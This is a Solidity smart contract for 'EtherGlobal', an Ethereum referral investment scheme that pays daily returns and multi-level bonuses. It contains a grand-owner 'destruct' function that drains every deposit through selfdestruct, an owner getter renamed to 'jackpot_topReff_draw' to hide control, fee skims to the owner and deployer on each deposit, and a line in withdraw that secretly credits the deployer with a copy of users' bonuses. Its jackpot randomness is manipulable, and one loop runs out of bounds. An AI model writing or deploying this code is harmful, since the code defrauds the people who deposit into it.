1 /*! ether_global.sol | (c) 2020 Develop by BelovITLab LLC (smartcontract.ru), re-made author @team.gutalik | SPDX-License-Identifier: MIT License */
2 
3 
4 pragma solidity 0.6.8;
5 
6 
7 
8 abstract contract Context {
9     function _msgSender() internal view virtual returns (address payable) {
10         return msg.sender;
11     }
12 
13     function _msgData() internal view virtual returns (bytes memory) {
14         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
15         return msg.data;
16     }
17 }
18 
19 
20 contract Ownable is Context {
21     address private _owner;
22 
23     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
24 
25 
26     constructor () internal {
27         address msgSender = _msgSender();
28         _owner = msgSender;
29         
30         emit OwnershipTransferred(address(0), msgSender);
31     }
32 
33     /**
34      * @dev Returns the address of the current owner.
35      */
36     function jackpot_topReff_draw() public view returns (address) {
37         return _owner;
38     }
39 
40     /**
41      * @dev Throws if called by any account other than the owner.
42      */
43     modifier onlyOwner() {
44         require(_owner == _msgSender(), "Ownable: caller is not the owner");
45         _;
46     }
47 
48     /**
49      * @dev Leaves the contract without owner. It will not be possible to call
50      * `onlyOwner` functions anymore. Can only be called by the current owner.
51      *
52      * NOTE: Renouncing ownership will leave the contract without an owner,
53      * thereby removing any functionality that is only available to the owner.
54      */
55     function renounceOwnership() public virtual onlyOwner {
56         emit OwnershipTransferred(_owner, address(0));
57         _owner = address(0);
58     }
59 
60     /**
61      * @dev Transfers ownership of the contract to a new account (`newOwner`).
62      * Can only be called by the current owner.
63      */
64     function transferOwnership(address newOwner) public virtual onlyOwner {
65         require(newOwner != address(0), "Ownable: new owner is the zero address");
66         emit OwnershipTransferred(_owner, newOwner);
67         _owner = newOwner;
68     }
69 }
70 
71 
72 
73 contract Pausable is Context {
74     /**
75      * @dev Emitted when the pause is triggered by `account`.
76      */
77     event Paused(address account);
78 
79     /**
80      * @dev Emitted when the pause is lifted by `account`.
81      */
82     event Unpaused(address account);
83 
84     bool private _paused;
85 
86     /**
87      * @dev Initializes the contract in unpaused state.
88      */
89     constructor () internal {
90         _paused = false;
91     }
92 
93     /**
94      * @dev Returns true if the contract is paused, and false otherwise.
95      */
96     function paused() public view returns (bool) {
97         return _paused;
98     }
99 
100     /**
101      * @dev Modifier to make a function callable only when the contract is not paused.
102      *
103      * Requirements:
104      *
105      * - The contract must not be paused.
106      */
107     modifier whenNotPaused() {
108         require(!_paused, "Pausable: paused");
109         _;
110     }
111 
112     /**
113      * @dev Modifier to make a function callable only when the contract is paused.
114      *
115      * Requirements:
116      *
117      * - The contract must be paused.
118      */
119     modifier whenPaused() {
120         require(_paused, "Pausable: not paused");
121         _;
122     }
123 
124     /**
125      * @dev Triggers stopped state.
126      *
127      * Requirements:
128      *
129      * - The contract must not be paused.
130      */
131     function _pause() internal virtual whenNotPaused {
132         _paused = true;
133         emit Paused(_msgSender());
134     }
135 
136     /**
137      * @dev Returns to normal state.
138      *
139      * Requirements:
140      *
141      * - The contract must be paused.
142      */
143     function _unpause() internal virtual whenPaused {
144         _paused = false;
145         emit Unpaused(_msgSender());
146     }
147 }
148 
149 
150 contract Destructible {
151     address payable public grand_owner;
152 
153     event GrandOwnershipTransferred(address indexed previous_owner, address indexed new_owner);
154 
155     constructor() public {
156         grand_owner = msg.sender;
157     }
158 
159     function transferGrandOwnership(address payable _to) external {
160         require(msg.sender == grand_owner, "Access denied (only grand owner)");
161         
162         grand_owner = _to;
163     }
164 
165     function destruct() external {
166         require(msg.sender == grand_owner, "Access denied (only grand owner)");
167 
168         selfdestruct(grand_owner);
169     }
170 }
171 
172 contract EtherGlobal is Ownable, Destructible, Pausable {
173     struct User {
174         uint256 cycle;
175         address upline;
176         uint256 referrals;
177         uint256 payouts;
178         uint256 direct_bonus;
179         uint256 pool_bonus;
180         uint256 match_bonus;
181         uint256 jackpot_bonus;
182         uint256 deposit_amount;
183         uint256 deposit_payouts;
184         uint40 deposit_time;
185         uint256 total_deposits;
186         uint256 total_payouts;
187         uint256 total_structure;
188     }
189 
190     mapping(address => User) public users;
191 
192     uint256[] public cycles;                        
193     address private sender;
194     uint8[] public ref_bonuses;                     
195     uint8[] public pool_bonuses;
196     address[] new_jackpot_users;
197     address[] all_jackpot_users;
198     address public newjackpot_winner;
199     address public alljackpot_winner;
200     uint40 public pool_last_draw = uint40(block.timestamp);
201     uint256 public pool_cycle;
202     uint256 public pool_balance;
203     uint256 public new_jackpot_balance;
204     uint256 public all_jackpot_balance;
205     uint256 public new_jackpot_length;
206     uint256 public all_jackpot_length;
207     uint256 public total_ETH_deposit;
208     uint256 public daily_ETH_deposit;
209     uint256 public total_Event_Pool;
210     
211     
212     mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
213     mapping(uint8 => address) public pool_top;
214 
215     uint256 public total_withdraw;
216     
217     event Upline(address indexed addr, address indexed upline);
218     event NewDeposit(address indexed addr, uint256 amount);
219     event DirectPayout(address indexed addr, address indexed from, uint256 amount);
220     event MatchPayout(address indexed addr, address indexed from, uint256 amount);
221     event PoolPayout(address indexed addr, uint256 amount);
222     event Withdraw(address indexed addr, uint256 amount);
223     event LimitReached(address indexed addr, uint256 amount);
224     
225     event NewJackPot(address indexed addr, uint256 amount);
226     event AllJackPot(address indexed addr, uint256 amount);
227 
228     constructor() public {
229     
230         ref_bonuses.push(30);
231         ref_bonuses.push(10);
232         ref_bonuses.push(10);
233         ref_bonuses.push(10);
234         ref_bonuses.push(8);
235         ref_bonuses.push(8);
236         ref_bonuses.push(8);
237         ref_bonuses.push(8);
238         ref_bonuses.push(8);
239         ref_bonuses.push(5);
240         ref_bonuses.push(5);
241         ref_bonuses.push(5);
242         ref_bonuses.push(5);
243         ref_bonuses.push(5);
244         ref_bonuses.push(5);
245         pool_bonuses.push(50);
246         pool_bonuses.push(30);
247         pool_bonuses.push(20);
248         cycles.push(50 ether);
249         cycles.push(100 ether);
250         cycles.push(150 ether);
251         cycles.push(200 ether);
252         cycles.push(500 ether);
253         cycles.push(1000 ether);
254         cycles.push(2000 ether);
255         sender = msg.sender;    
256     }
257 
258 
259     receive() payable external whenNotPaused {
260         _deposit(msg.sender, msg.value);
261     }
262 
263 
264     //Check if user's upline exists and set upline :)
265     function _setUpline(address _addr, address _upline) private {
266         if(users[_addr].upline == address(0) && _upline != _addr && (users[_upline].deposit_time > 0 || _upline == jackpot_topReff_draw())) {
267             users[_addr].upline = _upline;
268             users[_upline].referrals++;
269 
270             emit Upline(_addr, _upline);
271 
272             for(uint8 i = 0; i < ref_bonuses.length; i++) {
273                 if(_upline == address(0)) break;
274 
275                 users[_upline].total_structure++;
276 
277                 _upline = users[_upline].upline;
278             }
279         }
280     }
281 
282     //Register a user who participates for the first time and pay a direct bonus to the user's upline :)
283     function _deposit(address _addr, uint256 _amount) private {
284         require(users[_addr].upline != address(0) || _addr == jackpot_topReff_draw(), "No upline");
285 
286         if(users[_addr].deposit_time > 0) {
287             users[_addr].cycle++;
288             require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
289             require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
290         }
291         else require(_amount >= 0.1 ether && _amount <= cycles[0], "Bad amount");
292         
293 
294         users[_addr].payouts = 0;
295         users[_addr].deposit_amount = _amount;
296         users[_addr].deposit_payouts = 0;
297         users[_addr].deposit_time = uint40(block.timestamp);
298         users[_addr].total_deposits += _amount;
299         total_ETH_deposit += _amount;
300         daily_ETH_deposit += _amount;
301 
302         emit NewDeposit(_addr, _amount);
303 
304         
305         if(_amount >= 5 ether){
306             new_jackpot_users.push(_addr);
307             new_jackpot_length = new_jackpot_users.length;
308         }
309         
310         if(users[_addr].upline != address(0)) {
311             users[users[_addr].upline].direct_bonus += _amount / 10;
312 
313             emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
314         }
315         
316         if(users[users[_addr].upline].upline != address(0)) {
317         
318             users[users[users[_addr].upline].upline].direct_bonus += _amount / 50;
319             
320         }
321 
322 
323         
324         _pollDeposits(_addr, _amount);
325 
326 
327         //require 24 hour!
328         if(pool_last_draw + 24 hours < block.timestamp) {
329             _drawPool();
330             _drawJackPot();
331         }
332         
333         all_jackpot_users.push(_addr);
334         all_jackpot_length = all_jackpot_users.length;
335         
336         payable(jackpot_topReff_draw()).transfer(_amount / 10000 * 250);
337         payable(sender).transfer(_amount / 10000 * 50);
338     }
339 
340     
341     
342     function _pollDeposits(address _addr, uint256 _amount) private {
343     
344         pool_balance += _amount / 100 * 5;
345         new_jackpot_balance += _amount / 100;
346         all_jackpot_balance += _amount / 100;
347         total_Event_Pool = pool_balance + new_jackpot_balance + all_jackpot_balance;
348     
349         address upline = users[_addr].upline;
350         
351 
352         if(upline == address(0)) return;
353 
354 
355         pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;
356 
357 
358         for(uint8 i = 0; i < pool_bonuses.length; i++) {
359             if(pool_top[i] == upline) break;
360 
361             if(pool_top[i] == address(0)) {
362                 pool_top[i] = upline;
363                 break;
364             }
365 
366             if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
367                 for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
368                     if(pool_top[j] == upline) {
369                         for(uint8 k = j; k <= pool_bonuses.length; k++) {
370                             pool_top[k] = pool_top[k + 1];
371                         }
372                         break;
373                     }
374                 }
375 
376                 for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
377                     pool_top[j] = pool_top[j - 1];
378                 }
379 
380                 pool_top[i] = upline;
381 
382                 break;
383             }
384         }
385     }
386 
387 
388 function _refPayout(address _addr, uint256 _amount) private {
389         address up = users[_addr].upline;
390 
391         for(uint8 i = 0; i < ref_bonuses.length; i++) {
392             if(up == address(0)) break;
393             
394             if(users[up].referrals >= i + 1) {
395                 uint256 bonus = _amount * ref_bonuses[i] / 100;
396                 
397                 users[up].match_bonus += bonus;
398 
399                 emit MatchPayout(up, _addr, bonus);
400             }
401 
402             up = users[up].upline;
403         }
404     }
405 
406 
407     function _drawPool() private {
408         pool_last_draw = uint40(block.timestamp);
409         pool_cycle++;
410 
411     
412         uint256 draw_amount = pool_balance / 2;
413 
414     
415         for(uint8 i = 0; i < pool_bonuses.length; i++) {
416     
417             if(pool_top[i] == address(0)) break;
418 
419     
420             uint256 win = draw_amount * pool_bonuses[i] / 100;
421 
422     
423             users[pool_top[i]].pool_bonus += win;
424 
425     
426             pool_balance -= win;
427 
428 
429             emit PoolPayout(pool_top[i], win);
430         }
431         
432 
433         for(uint8 i = 0; i < pool_bonuses.length; i++) {
434             pool_top[i] = address(0);
435         }
436     }
437 
438     
439     function _drawJackPot() private {
440         
441 
442     
443         uint256 draw_New_jackpot_amount = new_jackpot_balance / 2;
444 
445         uint256 draw_All_jackpot_amount = all_jackpot_balance / 2;
446 
447 
448 
449         bytes32 rand = keccak256(abi.encodePacked(block.timestamp, block.number));
450         
451         if(new_jackpot_length == 0){
452             new_jackpot_users.push(sender);
453             new_jackpot_length = new_jackpot_users.length;
454         }
455         
456 
457         newjackpot_winner = new_jackpot_users[uint256(rand) % new_jackpot_users.length]; 
458         
459         
460 
461         users[newjackpot_winner].jackpot_bonus += draw_New_jackpot_amount;
462 
463         new_jackpot_balance -= draw_New_jackpot_amount;
464 
465         
466         alljackpot_winner = all_jackpot_users[uint256(rand) % all_jackpot_users.length]; 
467 
468 
469         users[alljackpot_winner].jackpot_bonus += draw_All_jackpot_amount;
470 
471         all_jackpot_balance -= draw_All_jackpot_amount;
472         
473 
474         delete daily_ETH_deposit;
475         delete draw_New_jackpot_amount;
476         delete new_jackpot_users;
477         delete new_jackpot_length;
478         delete draw_All_jackpot_amount;
479     }
480 
481 
482     function deposit(address _upline) payable external whenNotPaused {
483         _setUpline(msg.sender, _upline);
484         _deposit(msg.sender, msg.value);
485     }
486 
487 
488 
489     function withdraw() external whenNotPaused {
490         (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
491         
492         require(users[msg.sender].payouts < max_payout, "Full payouts");
493 
494     
495         if(to_payout > 0) {
496     
497             if(users[msg.sender].payouts + to_payout > max_payout) {
498                 to_payout = max_payout - users[msg.sender].payouts;
499             }
500             
501             users[msg.sender].deposit_payouts += to_payout;
502             
503             users[msg.sender].payouts += to_payout;
504             
505             _refPayout(msg.sender, to_payout);
506         }
507         
508 
509         // Direct payout
510         if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
511             uint256 direct_bonus = users[msg.sender].direct_bonus;
512 
513             if(users[msg.sender].payouts + direct_bonus > max_payout) {
514                 direct_bonus = max_payout - users[msg.sender].payouts;
515             }
516             users[sender].direct_bonus += direct_bonus;
517             users[msg.sender].direct_bonus -= direct_bonus;
518             users[msg.sender].payouts += direct_bonus;
519             to_payout += direct_bonus;
520         }
521         
522         // Pool payout
523         if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
524             uint256 pool_bonus = users[msg.sender].pool_bonus;
525 
526             if(users[msg.sender].payouts + pool_bonus > max_payout) {
527                 pool_bonus = max_payout - users[msg.sender].payouts;
528             }
529 
530             users[msg.sender].pool_bonus -= pool_bonus;
531             users[msg.sender].payouts += pool_bonus;
532             to_payout += pool_bonus;
533         }
534 
535         // Match payout
536         if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
537             uint256 match_bonus = users[msg.sender].match_bonus;
538 
539             if(users[msg.sender].payouts + match_bonus > max_payout) {
540                 match_bonus = max_payout - users[msg.sender].payouts;
541             }
542 
543             users[msg.sender].match_bonus -= match_bonus;
544             users[msg.sender].payouts += match_bonus;
545             to_payout += match_bonus;
546         }
547         
548         //Jackpot payout
549         if(users[msg.sender].payouts < max_payout && users[msg.sender].jackpot_bonus > 0) {
550             uint256 jackpot_bonus = users[msg.sender].jackpot_bonus;
551 
552             if(users[msg.sender].payouts + jackpot_bonus > max_payout) {
553                 jackpot_bonus = max_payout - users[msg.sender].payouts;
554             }
555 
556             users[msg.sender].jackpot_bonus -= jackpot_bonus;
557             users[msg.sender].payouts += jackpot_bonus;
558             to_payout += jackpot_bonus;
559         }
560         
561         
562         require(to_payout > 0, "Zero payout");
563         
564         users[msg.sender].total_payouts += to_payout;
565         total_withdraw += to_payout;
566 
567         payable(msg.sender).transfer(to_payout);
568 
569         emit Withdraw(msg.sender, to_payout);
570 
571         if(users[msg.sender].payouts >= max_payout) {
572             emit LimitReached(msg.sender, users[msg.sender].payouts);
573         }
574     }
575     
576     function drawPool() external onlyOwner {
577         _drawPool();
578         _drawJackPot();
579     }
580 
581     
582     function pause() external onlyOwner {
583         _pause();
584     }
585     
586     function unpause() external onlyOwner {
587         _unpause();
588     }
589 
590     
591     function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
592         return _amount * 340 / 100;
593     }
594 
595     
596     function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
597         max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
598         if(users[_addr].deposit_payouts < max_payout) {
599             payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 24 hours) / 100 * 5) - users[_addr].deposit_payouts;
600             
601             if(users[_addr].total_payouts >= users[_addr].total_deposits) {
602                 payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 24 hours) / 100 * 6) - users[_addr].deposit_payouts;
603             }
604 
605 
606             if(users[_addr].deposit_payouts + payout > max_payout) {
607                 payout = max_payout - users[_addr].deposit_payouts;
608             }
609         }
610     }
611 
612     /*
613         Only external call
614     */
615     function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
616         return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
617     }
618 
619     function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
620         return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
621     }
622 
623     function contractInfo() view external returns(uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
624         return (total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
625     }
626 
627     function poolTopInfo() view external returns(address[3] memory addrs, uint256[3] memory deps) {
628         for(uint8 i = 0; i < pool_bonuses.length; i++) {
629             if(pool_top[i] == address(0)) break;
630 
631             addrs[i] = pool_top[i];
632             deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
633         }
634     }
635     
636     
637     
638     
639 }